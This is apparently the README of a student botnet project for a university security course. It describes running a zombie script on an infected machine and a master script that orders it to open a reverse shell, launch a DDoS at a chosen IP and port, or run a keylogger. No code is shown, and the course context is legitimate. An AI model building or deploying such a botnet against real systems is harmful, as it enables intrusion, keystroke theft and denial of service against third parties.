# Botnet
Botnet project for UIUC security course CS460

zombie script is run on infected machine using command "python zombie.py <PORT>" where <PORT> is the port number you want the zombie to listen on.

master script is run on the host machine using command "python master.py". It then waits for commands. Commands are in format "<INDEX> <CMD>" where <INDEX> is the index of the zombie machine you wish to send to or "all" if you wish to send to all zombies. <CMD> depends on which command you wish to execute.

Reverse shell - <CMD> = "RVSH".

DDOS attack - <CMD> = "DDOS,<DEST_IP>,<DEST_PORT>" where <DEST_IP> and <DEST_PORT> are the destination ip address and port for the attack.

Keylogger - <CMD> = "KEYL,<TIME>" where <TIME> is how long you wish to keylog.




FOR LEARNING PURPOSES ONLY. NOT FOR USE.
